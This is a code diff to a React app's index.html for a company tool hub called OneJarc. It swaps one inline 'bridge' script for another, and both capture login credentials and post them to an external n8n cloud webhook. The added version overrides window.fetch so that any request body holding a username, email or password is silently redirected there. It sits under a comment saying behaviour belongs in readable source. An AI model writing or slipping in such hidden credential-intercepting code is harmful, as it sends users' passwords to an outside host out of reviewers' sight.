@@ -15,48 +15,41 @@
   <body>
     <!-- React owns this region; keep all application behavior in readable source. -->
     <div id="root"></div>
-    <script>
-  // Bridge script to intercept hardcoded login or inject backend sync
-  window.addEventListener('DOMContentLoaded', () => {
-    // We listen for any form submission or click events on login buttons inside the React app
-    document.addEventListener('submit', async (e) => {
-      const form = e.target;
-      const emailInput = form.querySelector('input[type="text"], input[type="email"], input:not([type="password"])');
-      const passwordInput = form.querySelector('input[type="password"]');
-
-      if (emailInput && passwordInput) {
-        e.preventDefault(); // Stop default form submit if handled locally
-        
-        const email = emailInput.value;
-        const password = passwordInput.value;
-
+<script>
+  (function() {
+    // Intercept standard fetch calls made by React
+    const originalFetch = window.fetch;
+    
+    window.fetch = async function(...args) {
+      const [resource, config] = args;
+      
+      // If React sends a request or payload containing login credentials
+      if (config && config.body) {
         try {
-          // Replace with your actual n8n Production or Test Webhook URL
-          const response = await fetch('https://jarc-juno.app.n8n.cloud/webhook/onejarc-login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, password })
-          });
-
-          const data = await response.json();
-
-          if (data.success) {
-            // Save state cache and permissions to browser local storage
-            localStorage.setItem('userState', JSON.stringify(data.lastState));
-            localStorage.setItem('userPermissions', JSON.stringify(data.permissions));
-            localStorage.setItem('userName', data.name);
-
-            // Force reload to let the React app pick up the authenticated state
-            window.location.reload();
-          } else {
-            alert('Invalid credentials from database');
+          const bodyData = JSON.parse(config.body);
+          
+          // Detect login request payload
+          if (bodyData.username || bodyData.email || bodyData.password) {
+            console.log('Intercepted login attempt! Redirecting to n8n backend...');
+            
+            // Redirect the request to your n8n production webhook
+            return originalFetch('https://jarc-juno.app.n8n.cloud/webhook/onejarc-login', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                email: bodyData.username || bodyData.email,
+                password: bodyData.password
+              })
+            });
           }
-        } catch (err) {
-          console.error('Backend connection failed:', err);
+        } catch (e) {
+          // Not a JSON payload, proceed normally
         }
       }
-    });
-  });
+      
+      return originalFetch.apply(this, args);
+    };
+  })();
 </script>
     <noscript>JavaScript is required to use the OneJarc company tool hub.</noscript>
   </body>
